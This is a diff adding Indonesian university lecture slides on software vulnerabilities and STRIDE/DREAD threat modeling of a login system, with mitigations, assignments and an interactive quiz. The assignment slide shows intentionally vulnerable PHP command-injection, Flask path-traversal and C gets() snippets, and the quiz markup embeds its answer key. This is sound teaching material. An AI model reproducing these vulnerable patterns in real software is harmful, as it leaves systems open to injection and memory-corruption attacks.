+        <div class="dfd-node dfd-ext" style="display:inline-block;margin:0 16px">
+          <div class="nn">📋</div>
+          <div class="nl">Audit Log</div>
+          <div class="dfd-flow-label">(Data Store)</div>
+        </div>
+        <div class="dfd-node dfd-proc" style="display:inline-block;margin:0 16px">
+          <div class="nn">📧</div>
+          <div class="nl">Email Service</div>
+          <div class="dfd-flow-label">(Ext. Service)</div>
+        </div>
+        <div class="dfd-node dfd-proc" style="display:inline-block;margin:0 16px">
+          <div class="nn">🔑</div>
+          <div class="nl">Session Store</div>
+          <div class="dfd-flow-label">(Redis/Data Store)</div>
+        </div>
+      </div>
+    </div>
+    <div class="lbl mt16">Step 2–3: Hasil STRIDE + DREAD Scoring</div>
+    <table class="threat-table mt12">
+      <tr>
+        <th>ID</th><th>Komponen</th><th>STRIDE</th><th>Deskripsi Ancaman</th><th>D</th><th>R</th><th>E</th><th>A</th><th>D</th><th>Skor</th><th>Prioritas</th>
+      </tr>
+      <tr>
+        <td><strong>T1</strong></td><td>Auth Service</td><td><span class="badge b-blue">S</span></td>
+        <td>Brute force attack pada endpoint login — percobaan password berulang</td>
+        <td>4</td><td>5</td><td>5</td><td>5</td><td>4</td><td><strong>23</strong></td><td><span class="sev-h">HIGH</span></td>
+      </tr>
+      <tr>
+        <td><strong>T2</strong></td><td>User DB</td><td><span class="badge b-red">T+I</span></td>
+        <td>SQL Injection melalui parameter login — dump/modifikasi database</td>
+        <td>5</td><td>4</td><td>4</td><td>5</td><td>3</td><td><strong>21</strong></td><td><span class="sev-h">HIGH</span></td>
+      </tr>
+      <tr>
+        <td><strong>T3</strong></td><td>Web Frontend</td><td><span class="badge b-orange">I</span></td>
+        <td>Stack trace terekspos di error response — mengungkap struktur aplikasi</td>
+        <td>3</td><td>5</td><td>5</td><td>5</td><td>5</td><td><strong>23</strong></td><td><span class="sev-h">HIGH</span></td>
+      </tr>
+      <tr>
+        <td><strong>T4</strong></td><td>Session Store</td><td><span class="badge b-blue">S</span></td>
+        <td>Session fixation — penyerang menetapkan Session ID sebelum login</td>
+        <td>4</td><td>3</td><td>3</td><td>4</td><td>2</td><td><strong>16</strong></td><td><span class="sev-m">MEDIUM</span></td>
+      </tr>
+      <tr>
+        <td><strong>T5</strong></td><td>Auth Service</td><td><span class="badge b-gray">D</span></td>
+        <td>DoS via resource exhaustion — banjir request tanpa rate limiting</td>
+        <td>3</td><td>5</td><td>4</td><td>5</td><td>4</td><td><strong>21</strong></td><td><span class="sev-h">HIGH</span></td>
+      </tr>
+      <tr>
+        <td><strong>T6</strong></td><td>Audit Log</td><td><span class="badge b-gray">R</span></td>
+        <td>Log tidak mencatat event penting — user menyangkal akses tidak sah</td>
+        <td>2</td><td>3</td><td>3</td><td>2</td><td>2</td><td><strong>12</strong></td><td><span class="sev-l">LOW</span></td>
+      </tr>
+      <tr>
+        <td><strong>T7</strong></td><td>Auth Service</td><td><span class="badge b-purple">E</span></td>
+        <td>Privilege escalation via JWT role claim manipulation</td>
+        <td>5</td><td>3</td><td>3</td><td>4</td><td>2</td><td><strong>17</strong></td><td><span class="sev-m">MEDIUM</span></td>
+      </tr>
+    </table>
+  </div>
+</div>
+
+<!-- ═══ SLIDE 10 – MITIGASI DEMO ═══ -->
+<div class="slide" id="s10" data-title="Step 4: Mitigasi Ancaman">
+  <div class="sh">
+    <div class="lbl">Demo — Step 4</div>
+    <h2>Mitigasi Ancaman — Hasil Threat Modeling Sistem Login</h2>
+    <p>Tindakan konkret untuk setiap ancaman HIGH dan MEDIUM yang ditemukan</p>
+  </div>
+  <div class="sb">
+    <div class="two">
+      <div>
+        <h3 class="sec">🔴 HIGH Priority Mitigations</h3>
+        <div class="card" style="border-left:4px solid var(--danger);margin-bottom:12px">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+            <strong style="font-size:13.5px">T1 — Brute Force (Spoofing)</strong>
+            <span class="badge b-red">CVSS 9.1</span>
+          </div>
+          <ul class="dot">
+            <li>Implementasi <strong>rate limiting</strong> (maks 5 attempt/menit per IP)</li>
+            <li>Account lockout setelah 10 kali gagal (progressive delay)</li>
+            <li>Wajibkan <strong>Multi-Factor Authentication (MFA)</strong></li>
+            <li>Gunakan CAPTCHA setelah 3 kali gagal</li>
+            <li>Monitor dan alert anomaly login pattern</li>
+          </ul>
+        </div>
+        <div class="card" style="border-left:4px solid var(--danger);margin-bottom:12px">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+            <strong style="font-size:13.5px">T2 — SQL Injection (Tampering)</strong>
+            <span class="badge b-red">CVSS 9.8</span>
+          </div>
+          <ul class="dot">
+            <li>Gunakan <strong>Prepared Statements</strong> / Parameterized Query untuk SEMUA query</li>
+            <li>Terapkan ORM (Eloquent, Hibernate, SQLAlchemy)</li>
+            <li>Input validation: whitelist karakter yang diizinkan</li>
+            <li>Least privilege DB user (SELECT only untuk read-only ops)</li>
+            <li>WAF (Web Application Firewall) sebagai lapisan tambahan</li>
+          </ul>
+        </div>
+        <div class="card" style="border-left:4px solid var(--danger)">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+            <strong style="font-size:13.5px">T3 — Info Disclosure (Error)</strong>
+            <span class="badge b-orange">CVSS 7.5</span>
+          </div>
+          <ul class="dot">
+            <li>Tampilkan <strong>pesan error generik</strong> ke pengguna ("Terjadi kesalahan")</li>
+            <li>Log detail error ke sistem logging internal (bukan ke response)</li>
+            <li>Matikan <strong>debug mode</strong> di production</li>
+            <li>Terapkan custom error pages (HTTP 404, 500)</li>
+          </ul>
+        </div>
+      </div>
+      <div>
+        <h3 class="sec">🟠 MEDIUM Priority &amp; Template Laporan</h3>
+        <div class="card" style="border-left:4px solid var(--orange);margin-bottom:12px">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+            <strong style="font-size:13.5px">T4 — Session Fixation (Spoofing)</strong>
+            <span class="badge b-orange">CVSS 6.8</span>
+          </div>
+          <ul class="dot">
+            <li>Regenerasi Session ID setelah login berhasil (<code>session_regenerate_id(true)</code>)</li>
+            <li>Set session cookie: <code>HttpOnly; Secure; SameSite=Strict</code></li>
+            <li>Session timeout yang wajar (30 menit idle)</li>
+          </ul>
+        </div>
+        <div class="card" style="border-left:4px solid var(--purple);margin-bottom:12px">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+            <strong style="font-size:13.5px">T7 — JWT Privilege Escalation</strong>
+            <span class="badge b-orange">CVSS 7.2</span>
+          </div>
+          <ul class="dot">
+            <li>Verifikasi JWT signature dengan secret yang kuat di server side</li>
+            <li>Jangan terima algoritma "none" → validasi <code>alg</code> header</li>
+            <li>Simpan role/permission di server state, bukan hanya di JWT payload</li>
+          </ul>
+        </div>
+        <div class="card" style="background:var(--darkblue);color:#fff">
+          <h3 style="color:var(--gold);font-size:13px;font-weight:700;margin-bottom:10px">📄 Template Dokumen Threat Model</h3>
+          <ul style="list-style:none;font-size:12.5px;line-height:2">
+            <li>1. <strong style="color:var(--lightgold)">Executive Summary</strong> — ringkasan temuan</li>
+            <li>2. <strong style="color:var(--lightgold)">System Overview</strong> — deskripsi &amp; scope</li>
+            <li>3. <strong style="color:var(--lightgold)">DFD &amp; Architecture Diagram</strong></li>
+            <li>4. <strong style="color:var(--lightgold)">Threat Enumeration (STRIDE)</strong></li>
+            <li>5. <strong style="color:var(--lightgold)">Risk Scoring (DREAD/CVSS)</strong></li>
+            <li>6. <strong style="color:var(--lightgold)">Mitigation Plan</strong> (dengan timeline)</li>
+            <li>7. <strong style="color:var(--lightgold)">Residual Risk &amp; Accepted Risks</strong></li>
+            <li>8. <strong style="color:var(--lightgold)">Review Schedule</strong></li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ SLIDE 11 – RANGKUMAN ═══ -->
+<div class="slide" id="s11" data-title="Rangkuman">
+  <div class="sh">
+    <div class="lbl">Rangkuman</div>
+    <h2>Rangkuman Pertemuan 2</h2>
+    <p>Sub-CPMK 261.1 — Kerawanan PL &amp; Model Ancaman | RKS222 PSSN</p>
+  </div>
+  <div class="sb">
+    <div class="sum-row">
+      <div class="sum-c sc1">
+        <div class="sicon">🕳️</div>
+        <h3>Klasifikasi Kerawanan</h3>
+        <ul>
+          <li>Memory Safety (Buffer Overflow, UAF)</li>
+          <li>Injection (SQL, XSS, Command)</li>
+          <li>Auth &amp; Access Control (IDOR)</li>
+          <li>Cryptographic Failures</li>
+          <li>Supply Chain Attack</li>
+        </ul>
+      </div>
+      <div class="sum-c sc2">
+        <div class="sicon">⚔️</div>
+        <h3>Jenis Serangan</h3>
+        <ul>
+          <li>OWASP Top 10 Web 2025 &amp; Mobile 2024</li>
+          <li>CWE Top 25 (2024)</li>
+          <li>Contoh CVE nyata</li>
+          <li>Vulnerable vs. Secure code</li>
+          <li>Attack vectors tiap jenis PL</li>
+        </ul>
+      </div>
+      <div class="sum-c sc3">
+        <div class="sicon">🗺️</div>
+        <h3>STRIDE Framework</h3>
+        <ul>
+          <li>S — Spoofing → Authentication</li>
+          <li>T — Tampering → Integrity</li>
+          <li>R — Repudiation → Non-repud.</li>
+          <li>I — Info Disclosure → Confidentiality</li>
+          <li>D — DoS → Availability</li>
+          <li>E — EoP → Authorization</li>
+        </ul>
+      </div>
+      <div class="sum-c sc4">
+        <div class="sicon">📊</div>
+        <h3>Proses Threat Modeling</h3>
+        <ul>
+          <li>DFD + Trust Boundaries</li>
+          <li>STRIDE per elemen DFD</li>
+          <li>DREAD scoring &amp; prioritasi</li>
+          <li>Mitigasi &amp; dokumentasi</li>
+          <li>Review berkala</li>
+        </ul>
+      </div>
+    </div>
+    <div class="card mt20" style="background:var(--darkblue);color:#fff;text-align:center;padding:22px">
+      <h3 style="font-size:17px;color:var(--lightgold);margin-bottom:10px">🎯 Pesan Kunci Pertemuan 2</h3>
+      <p style="font-size:14px;line-height:1.8;max-width:680px;margin:0 auto">
+        Memahami kerawanan saja tidak cukup — Anda harus mampu <strong style="color:var(--lightgold)">memodelkan ancaman secara sistematis</strong> sebelum sistem dibangun. Threat Modeling dengan STRIDE adalah jembatan antara teori keamanan dan implementasi nyata. <strong style="color:var(--lightgold)">Setiap komponen dalam sistem bisa diserang — kenali cara serangnya sebelum penyerang melakukannya.</strong>
+      </p>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ SLIDE 12 – TUGAS ═══ -->
+<div class="slide" id="s12" data-title="Tugas Mahasiswa">
+  <div class="sh">
+    <div class="lbl">Penugasan</div>
+    <h2>Tugas Pertemuan 2</h2>
+    <p>Sub-CPMK 261.1 | Dikumpulkan H-1 sebelum Pertemuan 3 via LMS poltekssn.co.id</p>
+  </div>
+  <div class="sb">
+    <div class="tug-hdr">
+      <div style="font-size:36px">📝</div>
+      <div>
+        <h2>Tugas Individu + Tugas Demonstrasi (Presentasi)</h2>
+        <p>Bobot: Kuis 40% + Presentasi 60% dari nilai Pertemuan 2 (total bobot MK 3%)</p>
+      </div>
+    </div>
+    <div class="tug-grid">
+      <div class="tug-card">
+        <h3>📋 Tugas 1: Analisis Kerawanan Kode (Individu)</h3>
+        <p>Diberikan <strong>3 snippet kode</strong> (PHP, Python, C) di bawah ini. Untuk setiap kode:</p>
+        <ul>
+          <li>Identifikasi jenis kerawanan (sebutkan CWE-nya)</li>
+          <li>Jelaskan bagaimana penyerang dapat mengeksploitasinya</li>
+          <li>Tulis versi kode yang aman beserta penjelasannya</li>
+          <li>Pemetaan ke OWASP Top 10 Web 2025 &amp; Mobile 2024 (kategori mana?)</li>
+        </ul>
+        <div class="card mt12" style="background:#1e1e2e;color:#cdd6f4;font-family:monospace;font-size:11.5px;line-height:1.8">
+          <div style="color:#89b4fa;margin-bottom:4px">// Kode 1 (PHP)</div>
+          <div style="color:#f38ba8">$cmd = "ping " . $_GET['host'];</div>
+          <div>system($cmd);</div>
+          <div style="color:#89b4fa;margin-top:8px;margin-bottom:4px"># Kode 2 (Python Flask)</div>
+          <div style="color:#f38ba8">@app.route('/file')</div>
+          <div style="color:#f38ba8">def get_file(): return open(request.args['name']).read()</div>
+          <div style="color:#89b4fa;margin-top:8px;margin-bottom:4px">// Kode 3 (C)</div>
+          <div style="color:#f38ba8">char buf[50]; gets(buf);</div>
+        </div>
+        <div class="info-chips">
+          <div class="ic">⏱️ <strong>60–90 menit</strong></div>
+          <div class="ic">📄 <strong>Format: PDF, min. 2 hal.</strong></div>
+        </div>
+      </div>
+      <div class="tug-card">
+        <h3>🗺️ Tugas 2: Presentasi Threat Model (Kelompok 2–3 orang)</h3>
+        <p>Buat <strong>Threat Model lengkap</strong> untuk salah satu sistem berikut (pilih satu):</p>
+        <ul>
+          <li><strong>Opsi A:</strong> Sistem registrasi &amp; login mahasiswa online</li>
+          <li><strong>Opsi B:</strong> API mobile banking sederhana (transfer &amp; cek saldo)</li>
+          <li><strong>Opsi C:</strong> Platform upload dan share dokumen (mirip Google Drive mini)</li>
+        </ul>
+        <p style="margin-top:8px"><strong>Yang harus dibuat dan dipresentasikan:</strong></p>
+        <ul>
+          <li>DFD Level 1 lengkap dengan trust boundaries</li>
+          <li>Tabel STRIDE per komponen (minimal 8 ancaman)</li>
+          <li>DREAD scoring untuk setiap ancaman</li>
+          <li>Tabel mitigasi untuk 3 ancaman teratas (HIGH)</li>
+          <li>Gunakan OWASP Threat Dragon atau Microsoft TMT sebagai tool</li>
+        </ul>
+        <div class="info-chips">
+          <div class="ic">⏱️ <strong>Presentasi 10 menit</strong></div>
+          <div class="ic">📊 <strong>Format: PPT + PDF laporan</strong></div>
+          <div class="ic">👥 <strong>Kelompok 2–3 orang</strong></div>
+        </div>
+      </div>
+      <div class="tug-card">
+        <h3>📊 Rubrik Penilaian Tugas 2 (Presentasi Threat Model)</h3>
+        <table class="rubrik">
+          <tr><th>Aspek</th><th>Bobot</th><th>Deskripsi Penilaian</th></tr>
+          <tr><td>Kelengkapan DFD</td><td>20%</td><td>DFD memiliki semua elemen (entity, process, datastore, flow, trust boundary) dan akurat</td></tr>
+          <tr><td>Ketepatan STRIDE</td><td>25%</td><td>Ancaman diidentifikasi dengan benar per elemen DFD, kategori STRIDE tepat</td></tr>
+          <tr><td>DREAD Scoring</td><td>15%</td><td>Skor masuk akal dan dapat diargumentasikan, prioritas tepat</td></tr>
+          <tr><td>Kualitas Mitigasi</td><td>25%</td><td>Mitigasi spesifik, dapat diimplementasikan, merujuk standar (OWASP/NIST)</td></tr>
+          <tr><td>Presentasi</td><td>15%</td><td>Jelas, terstruktur, mampu menjawab pertanyaan, waktu sesuai</td></tr>
+        </table>
+        <div class="info-chips mt12">
+          <div class="ic">📅 <strong>Deadline:</strong> H-1 sebelum Pertemuan 3</div>
+          <div class="ic">📤 <strong>Submit:</strong> LMS poltekssn.co.id</div>
+          <div class="ic">📁 <strong>NIM1_NIM2_TM2_KPL.zip</strong></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ SLIDE 13 – KUIS ═══ -->
+<div class="slide" id="s13" data-title="Kuis Pemahaman">
+  <div class="sh">
+    <div class="lbl">Kuis</div>
+    <h2>Kuis Pemahaman — Pertemuan 2</h2>
+    <p>Klik opsi jawaban. Jawaban benar dan salah akan langsung ditampilkan.</p>
+  </div>
+  <div class="sb">
+    <div class="two">
+      <div>
+        <div class="qcard">
+          <div class="qno">Pertanyaan 1 — Kerawanan Kode</div>
+          <p>Kode: <code>$query = "SELECT * FROM users WHERE id = " . $_GET['id'];</code> — Kerawanan apa dan mitigasi yang tepat?</p>
+          <div class="qopts" id="q1">
+            <button class="qopt" onclick="ans(this,'q1','w')">A. XSS — gunakan htmlspecialchars() pada output</button>
+            <button class="qopt" onclick="ans(this,'q1','c')">B. SQL Injection — gunakan prepared statement / parameterized query</button>
+            <button class="qopt" onclick="ans(this,'q1','w')">C. Path Traversal — gunakan realpath() untuk validasi path</button>
+            <button class="qopt" onclick="ans(this,'q1','w')">D. Buffer Overflow — gunakan strncpy() dengan batas panjang</button>
+          </div>
+        </div>
+        <div class="qcard">
+          <div class="qno">Pertanyaan 2 — STRIDE</div>
+          <p>Penyerang mengubah nilai parameter <code>?role=user</code> menjadi <code>?role=admin</code> di URL dan berhasil mendapatkan akses admin. Kategori STRIDE mana yang paling tepat?</p>
+          <div class="qopts" id="q2">
+            <button class="qopt" onclick="ans(this,'q2','w')">A. Spoofing — penyerang menyamar sebagai admin</button>
+            <button class="qopt" onclick="ans(this,'q2','w')">B. Tampering — penyerang memodifikasi data</button>
+            <button class="qopt" onclick="ans(this,'q2','w')">C. Information Disclosure — data role terekspos</button>
+            <button class="qopt" onclick="ans(this,'q2','c')">D. Elevation of Privilege — mendapat hak akses lebih tinggi dari yang diizinkan</button>
+          </div>
+        </div>
+      </div>
+      <div>
+        <div class="qcard">
+          <div class="qno">Pertanyaan 3 — Proses Threat Modeling</div>
+          <p>Dalam DFD, garis putus-putus merah yang memisahkan elemen "Browser Pengguna" dengan "Web Server" disebut apa dan apa fungsinya?</p>
+          <div class="qopts" id="q3">
+            <button class="qopt" onclick="ans(this,'q3','w')">A. Data Flow — menunjukkan arah aliran data antar komponen</button>
+            <button class="qopt" onclick="ans(this,'q3','c')">B. Trust Boundary — memisahkan zona kepercayaan berbeda; setiap data flow yang melewatinya harus divalidasi</button>
+            <button class="qopt" onclick="ans(this,'q3','w')">C. Network Boundary — batas fisik antara jaringan internal dan eksternal</button>
+            <button class="qopt" onclick="ans(this,'q3','w')">D. Security Zone — area di mana kontrol keamanan yang sama diterapkan</button>
+          </div>
+        </div>
+        <div class="qcard">
+          <div class="qno">Pertanyaan 4 — DREAD Scoring</div>
+          <p>Sebuah ancaman SQL Injection mendapat skor DREAD: D=5, R=5, E=4, A=5, D=3. Berapa total skor dan termasuk prioritas apa?</p>
+          <div class="qopts" id="q4">
+            <button class="qopt" onclick="ans(this,'q4','w')">A. Skor 20 — Medium Priority</button>
+            <button class="qopt" onclick="ans(this,'q4','w')">B. Skor 21 — Medium Priority</button>
+            <button class="qopt" onclick="ans(this,'q4','c')">C. Skor 22 — High Priority (≥ 20), harus ditangani segera</button>
+            <button class="qopt" onclick="ans(this,'q4','w')">D. Skor 22 — Low Priority, masuk backlog</button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ SLIDE 14 – REFERENSI ═══ -->
+<div class="slide" id="s14" data-title="Referensi">
+  <div class="sh">
+    <div class="lbl">Pustaka</div>
+    <h2>Referensi &amp; Sumber Belajar</h2>
+    <p>Pustaka sesuai RPS RKS222 + referensi terkini 2024–2025 termasuk OWASP Top 10 Web 2025 &amp; Mobile 2024</p>
+  </div>
+  <div class="sb">
+    <div class="two">
+      <div>
+        <h3 class="sec">📚 Pustaka Utama (RPS)</h3>
+        <div class="ref-item" style="border-color:var(--blue)"><div class="rnum" style="color:var(--blue)">1</div><div class="ryear">2024</div><div>Bulmash, G. &amp; Segura, T. <em>Crafting Secure Software.</em> Packt Publishing. <strong>— Referensi utama RPS</strong></div></div>
+        <div class="ref-item" style="border-color:var(--green)"><div class="rnum" style="color:var(--green)">2</div><div class="ryear">2003</div><div>Khan, S.A., et al. <em>Software Security Concept and Practice.</em> CRC Press.</div></div>
+        <div class="ref-item" style="border-color:var(--orange)"><div class="rnum" style="color:var(--orange)">3</div><div class="ryear">2021</div><div>OWASP Foundation. <em>OWASP Desktop App Security Top 10.</em> <a href="https://owasp.org/www-project-desktop-app-security-top-10/" target="_blank" style="color:var(--blue);font-size:11px">→ owasp.org</a></div></div>
+        <div class="ref-item" style="border-color:var(--purple)"><div class="rnum" style="color:var(--purple)">4</div><div class="ryear">2025</div><div>OWASP Foundation. <em>OWASP Top 10 Web Application Security Risks 2025.</em> <a href="https://owasp.org/Top10/2025/" target="_blank" style="color:var(--blue);font-size:11px">→ owasp.org/Top10/2025</a></div></div>
+        <div class="ref-item" style="border-color:#1a7a3c"><div class="rnum" style="color:#1a7a3c">4b</div><div class="ryear">2024</div><div>OWASP Foundation. <em>OWASP Mobile Top 10 2024 — Final Release.</em> <a href="https://owasp.org/www-project-mobile-top-10/" target="_blank" style="color:var(--blue);font-size:11px">→ owasp.org/www-project-mobile-top-10</a></div></div>
+        <div class="ref-item" style="border-color:var(--teal)"><div class="rnum" style="color:var(--teal)">5</div><div class="ryear">2022</div><div>NIST. <em>SP 800-218: SSDF v1.1.</em> <a href="https://csrc.nist.gov/pubs/sp/800/218/final" target="_blank" style="color:var(--blue);font-size:11px">→ csrc.nist.gov</a></div></div>
+        <div class="ref-item" style="border-color:var(--danger)"><div class="rnum" style="color:var(--danger)">6</div><div class="ryear">2020</div><div>Howard, M. &amp; LeBlanc, D. <em>Writing Secure Code.</em> Microsoft Press.</div></div>
+      </div>
+      <div>
+        <h3 class="sec">🌐 Referensi Terkini &amp; Online</h3>
+        <div class="ref-item" style="border-color:var(--blue)"><div class="rnum" style="color:var(--blue)">7</div><div class="ryear">2024</div><div>MITRE. <em>CWE Top 25 Most Dangerous Software Weaknesses 2024.</em> <a href="https://cwe.mitre.org/top25/" target="_blank" style="color:var(--blue);font-size:11px">→ cwe.mitre.org/top25</a></div></div>
+        <div class="ref-item" style="border-color:var(--orange)"><div class="rnum" style="color:var(--orange)">8</div><div class="ryear">2023</div><div>OWASP Foundation. <em>Threat Modeling Cheat Sheet.</em> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Threat_Modeling_Cheat_Sheet.html" target="_blank" style="color:var(--blue);font-size:11px">→ cheatsheetseries.owasp.org</a></div></div>
+        <div class="ref-item" style="border-color:var(--purple)"><div class="rnum" style="color:var(--purple)">9</div><div class="ryear">2024</div><div>OWASP Foundation. <em>Threat Dragon — Threat Modeling Tool.</em> <a href="https://www.threatdragon.com" target="_blank" style="color:var(--blue);font-size:11px">→ threatdragon.com</a></div></div>
+        <div class="ref-item" style="border-color:var(--green)"><div class="rnum" style="color:var(--green)">10</div><div class="ryear">2025</div><div>MITRE. <em>ATT&amp;CK Framework.</em> <a href="https://attack.mitre.org" target="_blank" style="color:var(--blue);font-size:11px">→ attack.mitre.org</a></div></div>
+        <div class="ref-item" style="border-color:var(--gold)"><div class="rnum" style="color:var(--gold)">11</div><div class="ryear">2025</div><div>PortSwigger. <em>Web Security Academy — All Topics.</em> <a href="https://portswigger.net/web-security" target="_blank" style="color:var(--blue);font-size:11px">→ portswigger.net/web-security</a></div></div>
+        <div class="card mt12" style="background:var(--darkblue);color:#fff">
+          <h3 style="color:var(--gold);font-size:13px;font-weight:700;margin-bottom:8px">🛠️ Lab Praktik Mandiri</h3>
+          <ul style="list-style:none;font-size:12.5px;line-height:2">
+            <li>🎯 <strong>PortSwigger Web Academy</strong> — SQL Injection, XSS, IDOR labs (gratis)</li>
+            <li>🏆 <strong>TryHackMe</strong> — OWASP Top 10 room, Advent of Cyber</li>
+            <li>🔧 <strong>DVWA</strong> (Damn Vulnerable Web App) — lab lokal</li>
+            <li>📱 <strong>DIVA Android / iGoat</strong> — lab mobile security (M1–M10)</li>
+            <li>🌐 <strong>OWASP Threat Dragon</strong> — latihan threat modeling</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+</div><!-- /ss -->
+
+<div id="nav">
+  <button class="nb" id="pb2" onclick="go(-1)" disabled>← Sebelumnya</button>
+  <div id="stb">Cover</div>
+  <div id="pb"><div id="pf" style="width:0%"></div></div>
+  <div id="sc">1 / 15</div>
+  <button class="nb" id="nb2" onclick="go(1)">Selanjutnya →</button>
+</div>
+
+<script>
+  const slides=document.querySelectorAll('.slide'),titles=Array.from(slides).map(s=>s.dataset.title||'');
+  let cur=0;const tot=slides.length;
+  function goTo(n){
+    slides[cur].classList.remove('active');cur=Math.max(0,Math.min(n,tot-1));
+    slides[cur].classList.add('active');slides[cur].scrollTop=0;
+    document.getElementById('pb2').disabled=cur===0;
+    document.getElementById('nb2').disabled=cur===tot-1;
+    document.getElementById('sc').textContent=`${cur+1} / ${tot}`;
+    document.getElementById('stb').textContent=titles[cur];
+    document.getElementById('pf').style.width=`${((cur+1)/tot)*100}%`;
+  }
+  function go(d){goTo(cur+d)}
+  document.addEventListener('keydown',e=>{if(e.key==='ArrowRight'||e.key==='ArrowDown')go(1);if(e.key==='ArrowLeft'||e.key==='ArrowUp')go(-1)});
+  function ans(btn,qId,r){
+    const c=document.getElementById(qId);
+    if(c.querySelector('.correct')||c.querySelector('.wrong'))return;
+    c.querySelectorAll('.qopt').forEach(b=>b.disabled=true);
+    btn.classList.add(r==='c'?'correct':'wrong');
+    if(r!=='c')c.querySelectorAll('.qopt').forEach(b=>{if(b.getAttribute('onclick').includes("'c'"))b.classList.add('correct')});
+  }
+  goTo(0);
+</script>
+</body>
+</html>
